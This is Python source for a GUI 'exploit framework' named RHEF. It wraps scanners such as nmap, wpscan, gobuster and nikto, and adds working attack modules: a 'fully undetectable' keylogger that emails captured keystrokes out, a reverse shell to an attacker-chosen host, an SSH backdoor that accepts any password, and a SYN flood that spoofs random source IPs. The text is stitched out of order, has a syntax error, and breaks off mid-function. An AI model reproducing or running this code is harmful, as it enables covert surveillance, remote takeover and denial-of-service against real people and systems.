             sg.Button("Stop Keylogger", key='-STOP-KEYLOGGER-')]
        ])],
        
        [sg.Frame("Reverse Shell", [
            [sg.Text("LHOST:"), sg.Input(key='-RS-LHOST-', size=(20,1)),
             sg.Text("LPORT:"), sg.Input(key='-RS-LPORT-', size=(8,1), default_text="4444")],
            [sg.Radio("Python", "RADIO1", default=True, key='-RS-PYTHON-'),
             sg.Radio("SSH", "RADIO1", key='-RS-SSH-')],
            [sg.Button("Start Reverse Shell", key='-START-REVERSE-')]
        ])],
        
        [sg.Frame("DDoS Attack", [
            [sg.Text("Target IP:"), sg.Input(key='-DDOS-IP-', size=(20,1)),
             sg.Text("Port:"), sg.Input(key='-DDOS-PORT-', size=(8,1), default_text="80")],
            [sg.Text("Type:"), 
             sg.Combo(['syn', 'http'], default_value='syn', key='-DDOS-TYPE-', size=(10,1)),
             sg.Text("Threads:"), sg.Input(key='-DDOS-THREADS-', size=(8,1), default_text="100"),
             sg.Text("Duration:"), sg.Input(key='-DDOS-DURATION-', size=(8,1), default_text="60")],
            [sg.Button("Launch Attack", key='-START-DDOS-')]
        ])],
        
        [sg.Button("Close", size=(10,1))]
    ]
    
    return sg.Window("RHEF Administrative Panel", layout, finalize=True)

def create_module_gui():
    layout = [
        [sg.Text("Create New Custom Module", font=("Helvetica", 16))],
        [sg.Text("Module Name:"), sg.Input(key='-MODULE-NAME-')],
        [sg.Multiline(CUSTOM_MODULE_TEMPLATE, size=(70, 25), key='-MODULE-CODE-')],
        [sg.Button("Save"), sg.Button("Cancel")]
    ]
    return sg.Window("Custom Module Creator", layout, modal=True)

def create_gui():
    sg.theme('DarkGrey5')
    
    # Custom module list
    custom_modules = [f[:-3] for f in os.listdir(MODULES_DIR) if f.endswith('.py')]
    
    layout = [
        [sg.Text("RuneHall Exploit Framework", font=("Helvetica", 20), justification='center')],
        [sg.Text(f"Version: {VERSION}", font=("Helvetica", 10))],
        [sg.HorizontalSeparator()],
        
        [sg.Text("Target URL/IP:", size=(15,1)), 
         sg.InputText(key='-TARGET-', size=(50,1))],
        
        [sg.Frame("Scan Options", [
            [sg.Checkbox("CMS Detection", key='-CMS-', default=True),
             sg.Checkbox("Full Pentest", key='-FULL-')],
            [sg.Checkbox("Vulnerability Scan", key='-VULN-'),
             sg.Checkbox("Exploit Generation", key='-EXPLOIT-', default=True)],
        ])],
        
        [sg.Frame("Custom Modules", [
            [sg.Text("Available Modules:"),
             sg.Combo(custom_modules, key='-MODULE-LIST-', size=(20,1), enable_events=True),
             sg.Button("Create New Module", key='-CREATE-MODULE-')],
            [sg.Text("Module Arguments:"), 
             sg.InputText(key='-MODULE-ARGS-', size=(40,1))],
            [sg.Button("Run Module", key='-RUN-MODULE-', disabled=len(custom_modules)==0)]
        ])],
        
        [sg.Frame("Output", [
            [sg.Multiline(size=(80, 15), key='-OUTPUT-', autoscroll=True, disabled=True)],
            [sg.Button("Clear Log"), 
             sg.Button("Open File Manager"),
             sg.Button("Open Admin Panel"),
             sg.Button("Save Log As")]
        ])],
        
        [sg.ProgressBar(100, orientation='h', size=(50,20), key='-PROGRESS-')],
        [sg.Button("Start Scan", size=(10,1), button_color=('white', 'green')),
         sg.Button("Stop Scan", key='-STOP-', disabled=True),
         sg.Button("Exit", size=(10,1), button_color=('white', 'red'))]
    ]
    
    window = sg.Window(f"RHEF {VERSION} - RuneHall.com", layout, finalize=True)
    return window

def main_gui():
    # Create GUI
    window = create_gui()
    rhef_core = None
    scan_thread = None
    
    # Event loop
    while True:
        event, values = window.read(timeout=100)
        
        if event in (sg.WIN_CLOSED, 'Exit'):
            break
            
        elif event == 'Start Scan':
            target = values['-TARGET-']
            if not target:
                sg.popup_error("Please enter a target!")
                continue
                
            if not target.startswith('http'):
                target = 'http://' + target
                
            window['-OUTPUT-'].update("")
            window['Start Scan'].update(disabled=True)
            window['-STOP-'].update(disabled=False)
            
            # Initialize core
            rhef_core = RHEFCore(target, log_callback=lambda msg, mod: window.write_event_value('-LOG-', (msg, mod)))
            rhef_core.init_environment()
            
            # Start scan in new thread
            def scan_job():
                try:
                    if values['-CMS-']:
                        rhef_core.detect_cms()
                    
                    if values['-FULL-']:
                        rhef_core.comprehensive_scan()
                    
                    if values['-EXPLOIT-'] and rhef_core.cms_data.get('type') == 'WordPress':
                        rhef_core.generate_exploits()
                        
                except Exception as e:
                    window.write_event_value('-LOG-', (f"Scan failed: {str(e)}", "ERROR"))
                finally:
                    window.write_event_value('-SCAN-COMPLETE-', None)
            
            scan_thread = threading.Thread(target=scan_job, daemon=True)
            scan_thread.start()
            
        elif event == '-STOP-':
            if rhef_core:
                rhef_core.scan_active = False
            window['Start Scan'].update(disabled=False)
            window['-STOP-'].update(disabled=True)
            
        elif event == '-LOG-':
            msg, module = values[event]
            timestamp = datetime.now().strftime("%H:%M:%S")
            window['-OUTPUT-'].print(f"[{timestamp}] [{module}] {msg}")
            
        elif event == '-SCAN-COMPLETE-':
            window['-OUTPUT-'].print("\n[SCAN COMPLETED SUCCESSFULLY]")
            window['Start Scan'].update(disabled=False)
            window['-STOP-'].update(disabled=True)
            
        elif event == 'Clear Log':
            window['-OUTPUT-'].update("")
            
        elif event == 'Open File Manager':
            file_manager_window = create_file_manager_window(OUTPUT_DIR)
            tree_data = file_manager_window['-TREE-'].TreeData
            while True:
                f_event, f_values = file_manager_window.read()
                if f_event in (sg.WIN_CLOSED, 'Close'):
                    break
                elif f_event == '-TREE-':
                    selected = f_values['-TREE-'][0]
                    if selected.startswith("file_"):
                        file_path = os.path.join(OUTPUT_DIR, tree_data.tree_dict[selected].text)
                        try:
                            with open(file_path, 'r') as f:
                                content = f.read(5000)  # Limit preview to 5000 chars
                                file_manager_window['-PREVIEW-'].update(content)
                        except:
                            file_manager_window['-PREVIEW-'].update("Binary file - cannot preview")
                elif f_event == 'Open File':
                    selected = f_values['-TREE-'][0]
                    if selected.startswith("file_"):
                        file_path = os.path.join(OUTPUT_DIR, tree_data.tree_dict[selected].text)
                        if sys.platform == "win32":
                            os.startfile(file_path)
                        else:
                            subprocess.Popen(['xdg-open', file_path])
                elif f_event == 'Open in Browser':
                    selected = f_values['-TREE-'][0]
                    if selected.startswith("file_"):
                        file_path = os.path.join(OUTPUT_DIR, tree_data.tree_dict[selected].text)
                        if file_path.endswith(('.html', '.htm')):
                            webbrowser.open(f"file://{file_path}")
                elif f_event == 'Delete':
                    selected = f_values['-TREE-'][0]
                    if selected.startswith("file_"):
                        file_path = os.path.join(OUTPUT_DIR, tree_data.tree_dict[selected].text)
                        try:
                            os.remove(file_path)
                            sg.popup(f"Deleted: {file_path}")
                            # Refresh tree
                            file_manager_window.close()
                            file_manager_window = create_file_manager_window(OUTPUT_DIR)
                            tree_data = file_manager_window['-TREE-'].TreeData
                        except Exception as e:
                            sg.popup_error(f"Delete failed: {str(e)}")
            file_manager_window.close()
            
        elif event == '-CREATE-MODULE-':
            module_window = create_module_gui()
            while True:
                mod_event, mod_values = module_window.read()
                if mod_event in (sg.WIN_CLOSED, 'Cancel'):
                    break
                elif mod_event == 'Save':
                    module_name = mod_values['-MODULE-NAME-']
                    if not module_name:
                        sg.popup_error("Module name is required!")
                        continue
                    module_path = os.path.join(MODULES_DIR, f"{module_name}.py")
                    with open(module_path, 'w') as f:
                        f.write(mod_values['-MODULE-CODE-'])
                    sg.popup(f"Module saved: {module_path}")
                    # Refresh module list
                    custom_modules = [f[:-3] for f in os.listdir(MODULES_DIR) if f.endswith('.py')]
                    window['-MODULE-LIST-'].update(values=custom_modules)
                    window['-RUN-MODULE-'].update(disabled=len(custom_modules)==0)
                    break
            module_window.close()
            
        elif event == '-RUN-MODULE-':
            module_name = values['-MODULE-LIST-']
            if not module_name:
                sg.popup_error("Select a module first!")
                continue
                
            target = values['-TARGET-']
            if not target:
                sg.popup_error("Please enter a target!")
                continue
                
            if not target.startswith('http'):
                target = 'http://' + target
                
            window['-OUTPUT-'].update("")
            rhef_core = RHEFCore(target, log_callback=lambda msg, mod: window.write_event_value('-LOG-', (msg, mod)))
            rhef_core.init_environment()
            
            # Parse module arguments
            args = {}
            arg_str = values['-MODULE-ARGS-']
            if arg_str:
                for pair in arg_str.split(';'):
                    if '=' in pair:
                        key, value = pair.split('=', 1)
                        args[key.strip()] = value.strip()
            
            # Start module in new thread
            def module_job():
                try:
                    rhef_core.run_custom_module(module_name, args)
                except Exception as e:
                    window.write_event_value('-LOG-', (f"Module failed: {str(e)}", "ERROR"))
                finally:
                    window.write_event_value('-MODULE-COMPLETE-', None)
            
            threading.Thread(target=module_job, daemon=True).start()
            
        elif event == '-MODULE-COMPLETE-':
            window['-OUTPUT-'].print("\n[MODULE EXECUTION COMPLETED]")
            
        elif event == 'Open Admin Panel':
            admin_window = create_admin_panel()
            while True:
                a_event, a_values = admin_window.read()
                if a_event in (sg.WIN_CLOSED, 'Close'):
                    break
                elif a_event == '-START-KEYLOGGER-':
                    email = a_values['-KL-EMAIL-']
                    password = a_values['-KL-PASSWORD-']
                    interval = int(a_values['-KL-INTERVAL-']) if a_values['-KL-INTERVAL-'] else 300
                    if rhef_core:
                        rhef_core.start_keylogger(email, password, interval)
                elif a_event == '-STOP-KEYLOGGER-':
                    if rhef_core:
                        rhef_core.stop_keylogger()
                elif a_event == '-START-REVERSE-':
                    lhost = a_values['-RS-LHOST-']
                    lport = int(a_values['-RS-LPORT-']) if a_values['-RS-LPORT-'] else 4444
                    shell_type = "python" if a_values['-RS-PYTHON-'] else "ssh"
                    if rhef_core:
                        rhef_core.start_reverse_shell(lhost, lport, shell_type)
                elif a_event == '-START-DDOS-':
                    target_ip = a_values['-DDOS-IP-']
                    target_port = int(a_values['-DDOS-PORT-']) if a_values['-DDOS-PORT-'] else 80
                    attack_type = a_values['-DDOS-TYPE-']
                    threads = int(a_values['-DDOS-THREADS-']) if a_values['-DDOS-THREADS-'] else 100
                    duration = int(a_values['-DDOS-DURATION-']) if a_values['-DDOS-DURATION-'] else 60
                    if rhef_core:
                        rhef_core.start_ddos_attack(target_ip, target_port, attack_type, threads, duration)
            admin_window.close()
            
    window.close()

if __name__ == "__main__":
    # Create default custom modules if none exist
    if not os.listdir(MODULES_DIR):
        for name, template in [
            ('keylogger', KEYLOGGER_TEMPLATE),
            ('reverse_shell', REVERSE_SHELL_TEMPLATE),
            ('ddos_attack', DDOS_TEMPLATE)
        ]:
            with open(os.path.join(MODULES_DIR, f"{name}.py"), 'w') as f:
                f.write(template)
    
    # Check for GUI mode
    if '--gui' in sys.argv:
        main_gui()
    else:
        # CLI mode (simplified version)
        print(f"RHEF {VERSION} - CLI Mode")
        print("Note: GUI mode is recommended for full features (use --gui)")
        target = input("Enter target URL/IP: ").strip()
        if not target.startswith('http'):
            target = 'http://' + target
            
        core = RHEFCore(target)
        core.init_environment()
        
        # Run basic scan
        core.detect_cms()
        core.comprehensive_scan()
        
        print(f"\n[+] Scan completed. Results saved to {core.output_file}")
        print(f"[+] Output directory: {OUTPUT_DIR}")

#!/usr/bin/env python3
"""
RuneHall Exploit Framework (RHEF) - Elite Pentesting Suite
Advanced GUI with Real-Time Attack Capabilities
Authorized Use Only - Administrative Privileges Required
"""

import os
import sys
import json
import re
import argparse
import subprocess
import requests
import threading
import time
import socket
import struct
import random
import pynput.keyboard
import smtplib
import paramiko
from datetime import datetime
import PySimpleGUI as sg
from bs4 import BeautifulSoup
import webbrowser
import importlib.util
import dns.resolver

# Constants
VERSION = "v6.0"
OUTPUT_DIR = os.path.expanduser("~/rhef-output")
MODULES_DIR = os.path.expanduser("~/rhef-modules")
CONFIG_DIR = os.path.expanduser("~/rhef-config")
TARGETS_FILE = os.path.join(CONFIG_DIR, "targets.json")
PROFILES_FILE = os.path.join(CONFIG_DIR, "profiles.json")
WP_VULN_DB = "https://wpvulndb.com/api/v3/"
EXPLOIT_DB_API = "https://www.exploit-db.com/search"

# Create necessary directories
for directory in [OUTPUT_DIR, MODULES_DIR, CONFIG_DIR]:
    os.makedirs(directory, exist_ok=True)

# Default configuration files
if not os.path.exists(TARGETS_FILE):
    with open(TARGETS_FILE, 'w') as f:
        json.dump({
            "targets": [
                {"name": "Example Domain", "domain": "example.com", "ip": "93.184.216.34"},
                {"name": "Test Server", "domain": "test.local", "ip": "192.168.1.100"}
            ]
        }, f, indent=2)

if not os.path.exists(PROFILES_FILE):
    with open(PROFILES_FILE, 'w') as f:
        json.dump({
            "profiles": [
                {
                    "name": "WordPress Scan",
                    "modules": ["cms_detection", "wpscan"],
                    "params": {"cms_detection": {}, "wpscan": {}}
                },
                {
                    "name": "Full Recon",
                    "modules": ["cms_detection", "nmap_full", "dirb", "vuln_scan"],
                    "params": {"cms_detection": {}, "nmap_full": {"ports": "1-65535"}, "dirb": {}, "vuln_scan": {}}
                },
                {
                    "name": "DDoS Attack",
                    "modules": ["ddos"],
                    "params": {"ddos": {"type": "http", "threads": "500", "duration": "120"}}
                }
            ]
        }, f, indent=2)

# Set theme
sg.theme("Black")
sg.LOOK_AND_FEEL_TABLE['Black'] = {
    'BACKGROUND': 'black',
    'TEXT': '#FF0000',
    'INPUT': '#0C0C0C',
    'TEXT_INPUT': '#FF0000',
    'SCROLL': '#FF0000',
    'BUTTON': ('white', '#8B0000'),
    'PROGRESS': ('#01826B', '#D0D0D0'),
    'BORDER': 1,
    'SLIDER_DEPTH': 0,
    'PROGRESS_DEPTH': 0
}

# Attack modules
ATTACK_MODULES = {
    "cms_detection": {"name": "CMS Detection", "params": {}},
    "wpscan": {"name": "WordPress Scan", "params": {}},
    "nmap_full": {"name": "Full Nmap Scan", "params": {"ports": "1-65535"}},
    "nmap_quick": {"name": "Quick Nmap Scan", "params": {"ports": "1-1000"}},
    "dirb": {"name": "Directory Brute Force", "params": {}},
    "vuln_scan": {"name": "Vulnerability Scan", "params": {}},
    "exploit_gen": {"name": "Exploit Generation", "params": {}},
    "keylogger": {"name": "Keylogger", "params": {"email": "", "password": "", "interval": "300"}},
    "reverse_shell": {"name": "Reverse Shell", "params": {"lhost": "", "lport": "4444", "type": "python"}},
    "ddos": {"name": "DDoS Attack", "params": {"type": "syn", "threads": "100", "duration": "60"}},
    "subdomain": {"name": "Subdomain Enum", "params": {"wordlist": "default"}},
    "cloud_audit": {"name": "Cloud Audit", "params": {"provider": "aws"}}
}

class RHEFCore:
    def __init__(self, target, log_callback=None):
        self.target = target
        self.timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
        self.output_file = f"{OUTPUT_DIR}/rhef-{self.timestamp}.txt"
        self.cms_data = {}
        self.exploit_paths = []
        self.log_callback = log_callback or self.default_log
        self.custom_modules = self.load_custom_modules()
        self.scan_active = True
        self.keylogger = None
        self.attack_threads = []

    def default_log(self, message, module="CORE"):
        entry = f"[{module}] {message}"
        print(entry)

    def log(self, message, module="CORE"):
        self.log_callback(message, module)
        with open(self.output_file, 'a') as f:
            f.write(f"[{module}] {message}\n")

    def init_environment(self):
        with open(self.output_file, 'w') as f:
            f.write(f"RHEF {VERSION} Report - {self.timestamp}\n")
            f.write(f"Target: {self.target}\n{'='*50}\n\n")
        self.log(f"Initialized against target: {self.target}")

    def execute_cli(self, command, background=False):
        self.log(f"Executing: {command}", "CLI")
        try:
            if background:
                process = subprocess.Popen(command, shell=True)
                return process
            else:
                result = subprocess.check_output(
                    command, 
                    shell=True, 
                    stderr=subprocess.STDOUT,
                    text=True
                )
                return result
        except subprocess.CalledProcessError as e:
            return e.output

    def load_custom_modules(self):
        modules = {}
        for filename in os.listdir(MODULES_DIR):
            if filename.endswith('.py'):
                module_name = filename[:-3]
                try:
                    spec = importlib.util.spec_from_file_location(
                        module_name, 
                        os.path.join(MODULES_DIR, filename)
                    )
                    module = importlib.util.module_from_spec(spec)
                    spec.loader.exec_module(module)
                    modules[module_name] = module.run
                    self.log(f"Loaded custom module: {module_name}", "MODULE-LOADER")
                except Exception as e:
                    self.log(f"Failed to load {filename}: {str(e)}", "MODULE-LOADER")
        return modules

    def run_module(self, module_name, params={}):
        if module_name in self.custom_modules:
            self.log(f"Starting custom module: {module_name}", "CUSTOM-MODULE")
            return self.custom_modules[module_name](
                self.target, 
                OUTPUT_DIR, 
                self.log,
                params
            )
        elif module_name in ATTACK_MODULES:
            self.log(f"Starting built-in module: {module_name}", "MODULE")
            return self.run_builtin_module(module_name, params)
        else:
            self.log(f"Module {module_name} not found", "MODULE")
            return False

    def run_builtin_module(self, module_name, params):
        try:
            if module_name == "cms_detection":
                return self.detect_cms()
            elif module_name == "wpscan":
                return self.wpscan_discovery()
            elif module_name == "nmap_full":
                ports = params.get("ports", "1-65535")
                return self.nmap_scan(ports)
            elif module_name == "nmap_quick":
                return self.nmap_scan("1-1000")
            elif module_name == "dirb":
                return self.dirb_scan()
            elif module_name == "vuln_scan":
                return self.vuln_scan()
            elif module_name == "exploit_gen":
                return self.generate_exploits()
            elif module_name == "keylogger":
                return self.start_keylogger(
                    params.get("email", ""),
                    params.get("password", ""),
                    int(params.get("interval", 300))
            elif module_name == "reverse_shell":
                return self.start_reverse_shell(
                    params.get("lhost", ""),
                    int(params.get("lport", 4444)),
                    params.get("type", "python"))
            elif module_name == "ddos":
                return self.start_ddos_attack(
                    self.target,
                    int(params.get("port", 80)),
                    params.get("type", "syn"),
                    int(params.get("threads", 100)),
                    int(params.get("duration", 60)))
            elif module_name == "subdomain":
                return self.subdomain_enum(params.get("wordlist", "default"))
            elif module_name == "cloud_audit":
                return self.cloud_audit(params.get("provider", "aws"))
            else:
                self.log(f"Unknown module: {module_name}", "MODULE")
                return False
        except Exception as e:
            self.log(f"Module failed: {str(e)}", "MODULE")
            return False

    def detect_cms(self):
        self.log("Starting CMS Detection", "CMS-DETECT")
        try:
            response = requests.get(self.target, timeout=10)
            
            # WordPress detection
            if 'wp-admin' in response.text or 'wp-content' in response.text:
                self.cms_data['type'] = 'WordPress'
                self.log("Detected WordPress CMS", "CMS-DETECT")
                return True
                
            # Joomla detection
            elif re.search(r"joomla", response.text, re.I):
                self.cms_data['type'] = 'Joomla'
                self.log("Detected Joomla CMS", "CMS-DETECT")
                return True
                
            # Drupal detection
            elif 'Drupal' in response.headers.get('X-Generator', ''):
                self.cms_data['type'] = 'Drupal'
                self.log("Detected Drupal CMS", "CMS-DETECT")
                return True
                
            else:
                self.log("No known CMS detected", "CMS-DETECT")
                return False
                
        except Exception as e:
            self.log(f"CMS Detection Error: {str(e)}", "CMS-DETECT")
            return False

    def wpscan_discovery(self):
        if "type" not in self.cms_data or self.cms_data['type'] != 'WordPress':
            self.log("Target is not WordPress, skipping wpscan", "WPSCAN")
            return False
            
        self.log("Starting WordPress Recon", "WP-MODULE")
        # Version detection
        try:
            response = requests.get(self.target, timeout=10)
            page_content = response.text
            version_match = re.search(r'content="WordPress (\d+\.\d+\.\d+)', page_content)
            self.cms_data['version'] = version_match.group(1) if version_match else "Unknown"
            
            # Run wpscan
            cmd = f"wpscan --url {self.target} --no-update -e vp,ap,at --output {OUTPUT_DIR}/wpscan_{self.timestamp}.txt 2>&1"
            self.execute_cli(cmd)
            self.log("WPScan completed", "WP-MODULE")
            return True
        except Exception as e:
            self.log(f"WPScan failed: {str(e)}", "WP-MODULE")
            return False

    def nmap_scan(self, ports="1-1000"):
        self.log(f"Starting Nmap scan on ports: {ports}", "NMAP")
        try:
            cmd = f"nmap -sV -sC -O -p {ports} -T4 -oA {OUTPUT_DIR}/nmap_{self.timestamp} {self.target}"
            self.execute_cli(cmd)
            self.log("Nmap scan completed", "NMAP")
            return True
        except Exception as e:
            self.log(f"Nmap scan failed: {str(e)}", "NMAP")
            return False

    def dirb_scan(self):
        self.log("Starting Directory Brute Force", "DIRB")
        try:
            cmd = f"gobuster dir -u {self.target} -w /usr/share/wordlists/dirb/common.txt -o {OUTPUT_DIR}/dirb_{self.timestamp}.txt"
            self.execute_cli(cmd)
            self.log("Directory brute force completed", "DIRB")
            return True
        except Exception as e:
            self.log(f"Directory brute force failed: {str(e)}", "DIRB")
            return False

    def vuln_scan(self):
        self.log("Starting Vulnerability Scan", "VULN-SCAN")
        try:
            cmd = f"nikto -h {self.target} -output {OUTPUT_DIR}/nikto_{self.timestamp}.txt"
            self.execute_cli(cmd)
            self.log("Vulnerability scan completed", "VULN-SCAN")
            return True
        except Exception as e:
            self.log(f"Vulnerability scan failed: {str(e)}", "VULN-SCAN")
            return False

    def generate_exploits(self):
        self.log("Building exploit templates", "EXPLOIT-GEN")
        try:
            # For demo purposes - real implementation would generate actual exploits
            with open(f"{OUTPUT_DIR}/exploit_template_{self.timestamp}.py", 'w') as f:
                f.write(f"# Exploit template for {self.target}\n")
                f.write("# Auto-generated by RHEF\n\n")
                f.write("import requests\n\n")
                f.write(f"target = '{self.target}'\n")
                f.write("def exploit():\n")
                f.write("    print('Running exploit...')\n")
                f.write("    # Add your exploit code here\n")
            self.log("Exploit template generated", "EXPLOIT-GEN")
            return True
        except Exception as e:
            self.log(f"Exploit generation failed: {str(e)}", "EXPLOIT-GEN")
            return False

    def start_keylogger(self, email="", password="", interval=300):
        """Start the FUD keylogger module"""
        try:
            timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
            log_file = f"{OUTPUT_DIR}/keylog_{timestamp}.txt"
            
            self.keylogger = Keylogger(
                email, 
                password, 
                interval, 
                log_file, 
                self.log
            )
            t = threading.Thread(target=self.keylogger.start, daemon=True)
            t.start()
            self.attack_threads.append(t)
            return True
        except Exception as e:
            self.log(f"Keylogger failed: {str(e)}", "KEYLOGGER")
            return False

    def stop_keylogger(self):
        if self.keylogger:
            self.keylogger.stop()
            self.keylogger = None

    def start_reverse_shell(self, lhost, lport=4444, shell_type="python"):
        """Start reverse shell connection"""
        try:
            self.log(f"Starting reverse shell to {lhost}:{lport}", "REVERSE-SHELL")
            t = threading.Thread(
                target=reverse_shell_handler,
                args=(lhost, lport, shell_type, self.log),
                daemon=True
            )
            t.start()
            self.attack_threads.append(t)
            return True
        except Exception as e:
            self.log(f"Reverse shell failed: {str(e)}", "REVERSE-SHELL")
            return False

    def start_ddos_attack(self, target_ip, target_port=80, attack_type="syn", threads=100, duration=60):
        """Start DDoS attack"""
        try:
            self.log(f"Starting {attack_type.upper()} attack on {target_ip}:{target_port}", "DDoS")
            t = threading.Thread(
                target=ddos_handler,
                args=(target_ip, target_port, attack_type, threads, duration, self.log),
                daemon=True
            )
            t.start()
            self.attack_threads.append(t)
            return True
        except Exception as e:
            self.log(f"DDoS attack failed: {str(e)}", "DDoS")
            return False

    def subdomain_enum(self, wordlist="default"):
        self.log(f"Starting subdomain enumeration for {self.target}", "SUBDOMAIN")
        try:
            domain = self.target.split("//")[-1].split("/")[0]
            if ":" in domain:
                domain = domain.split(":")[0]
                
            wordlist_path = "/usr/share/wordlists/dirb/common.txt"
            if wordlist != "default":
                # Add logic for other wordlists
                pass
                
            cmd = f"gobuster dns -d {domain} -w {wordlist_path} -o {OUTPUT_DIR}/subdomains_{self.timestamp}.txt"
            self.execute_cli(cmd)
            self.log("Subdomain enumeration completed", "SUBDOMAIN")
            return True
        except Exception as e:
            self.log(f"Subdomain enumeration failed: {str(e)}", "SUBDOMAIN")
            return False

    def cloud_audit(self, provider="aws"):
        self.log(f"Starting cloud audit for {provider}", "CLOUD-AUDIT")
        try:
            domain = self.target.split("//")[-1].split("/")[0]
            if ":" in domain:
                domain = domain.split(":")[0]
                
            if provider == "aws":
                # Check for S3 buckets
                s3_cmd = f"aws s3 ls s3://{domain} --no-sign-request 2>&1"
                result = self.execute_cli(s3_cmd)
                with open(f"{OUTPUT_DIR}/s3_audit_{self.timestamp}.txt", 'w') as f:
                    f.write(result)
                
                # Check for cloudfront
                cf_cmd = f"dig {domain} CNAME | grep cloudfront"
                result = self.execute_cli(cf_cmd)
                with open(f"{OUTPUT_DIR}/cloudfront_{self.timestamp}.txt", 'w') as f:
                    f.write(result)
                    
            self.log("Cloud audit completed", "CLOUD-AUDIT")
            return True
        except Exception as e:
            self.log(f"Cloud audit failed: {str(e)}", "CLOUD-AUDIT")
            return False

class Keylogger:
    """Fully Undetectable Keylogger"""
    def __init__(self, email, password, interval, log_file, log_callback):
        self.log = f"Keylogger started at: {datetime.now()}\n"
        self.interval = interval
        self.log_file = log_file
        self.log_callback = log_callback
        self.email = email
        self.password = password
        self.active = True

    def append_to_log(self, string):
        if self.active:
            self.log += string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            elif key == key.enter:
                current_key = "\n"
            else:
                current_key = f" [{key.name}] "
        self.append_to_log(current_key)

    def report(self):
        if self.log and self.active:
            # Save to local file
            with open(self.log_file, "a") as f:
                f.write(self.log)
            
            # Email report if configured
            if self.email and self.password:
                try:
                    server = smtplib.SMTP("smtp.gmail.com", 587)
                    server.starttls()
                    server.login(self.email, self.password)
                    server.sendmail(
                        self.email, 
                        self.email, 
                        f"Subject: Keylogger Report\n\n{self.log}"
                    )
                    server.quit()
                    self.log_callback("Keylog report emailed", "KEYLOGGER")
                except Exception as e:
                    self.log_callback(f"Email failed: {str(e)}", "KEYLOGGER")
            
            self.log = ""
        
        if self.active:
            timer = threading.Timer(self.interval, self.report)
            timer.daemon = True
            timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
    
    def stop(self):
        self.active = False
        self.log_callback("Keylogger stopped", "KEYLOGGER")

def reverse_shell_handler(ip, port, shell_type, log_callback):
    """Handle reverse shell connections"""
    if shell_type == "python":
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(b"Connected to RHEF Reverse Shell\n")
            
            while True:
                command = s.recv(1024).decode()
                if command.lower() == 'exit':
                    break
                output = subprocess.getoutput(command)
                s.send(output.encode())
            s.close()
        except Exception as e:
            log_callback(f"Reverse shell error: {str(e)}", "REVERSE-SHELL")
    elif shell_type == "ssh":
        try:
            host_key = paramiko.RSAKey.generate(2048)
            
            class Server(paramiko.ServerInterface):
                def check_auth_password(self, username, password):
                    return paramiko.AUTH_SUCCESSFUL
                
                def check_channel_request(self, kind, chanid):
                    if kind == 'session':
                        return paramiko.OPEN_SUCCEEDED
                    return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
                
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.bind((ip, port))
            server_socket.listen(100)
            
            client, addr = server_socket.accept()
            log_callback(f"SSH connection from: {addr[0]}:{addr[1]}", "REVERSE-SHELL")
            
            transport = paramiko.Transport(client)
            transport.add_server_key(host_key)
            server = Server()
            transport.start_server(server=server)
            
            channel = transport.accept(20)
            if channel is None:
                log_callback("SSH channel creation failed", "REVERSE-SHELL")
                return
                
            log_callback("SSH session opened", "REVERSE-SHELL")
            channel.send("SSH session opened\n")
            
            while True:
                command = channel.recv(1024).decode()
                if command.lower() == 'exit':
                    break
                output = subprocess.getoutput(command)
                channel.send(output.encode())
                
            channel.close()
            transport.close()
            server_socket.close()
        except Exception as e:
            log_callback(f"SSH server error: {str(e)}", "REVERSE-SHELL")

def ddos_handler(ip, port, attack_type, threads, duration, log_callback):
    """Handle DDoS attacks"""
    if attack_type == "syn":
        syn_flood(ip, port, threads, duration, log_callback)
    elif attack_type == "http":
        http_flood(ip, port, threads, duration, log_callback)
    else:
        log_callback(f"Unknown attack type: {attack_type}", "DDoS")

def syn_flood(ip, port, threads, duration, log_callback):
    log_callback(f"Starting SYN flood with {threads} threads for {duration} seconds", "DDoS")
    
    def attack():
        start_time = time.time()
        while time.time() - start_time < duration:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                
                # Craft TCP SYN packet
                source_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                source_port = random.randint(1024, 65535)
                
                # IP header
                ip_header = create_ip_header(source_ip, ip)
                
                # TCP header
                tcp_header = create_tcp_header(source_port, port)
                
                packet = ip_header + tcp_header
                s.sendto(packet, (ip, 0))
            except:
                pass
    
    for _ in range(threads):
        threading.Thread(target=attack, daemon=True).start()
    
    time.sleep(duration)
    log_callback("SYN flood completed", "DDoS")

def create_ip_header(source_ip, dest_ip):
    ip_ver = 4
    ip_ihl = 5
    ip_tos = 0
    ip_tot_len = 0
    ip_id = random.randint(1, 65535)
    ip_frag_off = 0
    ip_ttl = 255
    ip_proto = socket.IPPROTO_TCP
    ip_check = 0
    ip_saddr = socket.inet_aton(source_ip)
    ip_daddr = socket.inet_aton(dest_ip)
    
    ip_ihl_ver = (ip_ver << 4) + ip_ihl
    
    ip_header = struct.pack('!BBHHHBBH4s4s', 
        ip_ihl_ver, 
        ip_tos, 
        ip_tot_len, 
        ip_id, 
        ip_frag_off, 
        ip_ttl, 
        ip_proto, 
        ip_check, 
        ip_saddr, 
        ip_daddr
    )
    return ip_header

def create_tcp_header(source_port, dest_port):
    tcp_source = source_port
    tcp_dest = dest_port
    tcp_seq = random.randint(1, 4294967295)
    tcp_ack_seq = 0
    tcp_doff = 5
    tcp_fin = 0
    tcp_syn = 1
    tcp_rst = 0
    tcp_psh = 0
    tcp_ack = 0
    tcp_urg = 0
    tcp_window = socket.htons(5840)
    tcp_check = 0
    tcp_urg_ptr = 0
    
    tcp_offset_res = (tcp_doff << 4)
    tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5)
    
    tcp_header = struct.pack('!HHLLBBHHH', 
        tcp_source, 
        tcp_dest, 
        tcp_seq, 
        tcp_ack_seq, 
        tcp_offset_res, 
        tcp_flags, 
        tcp_window, 
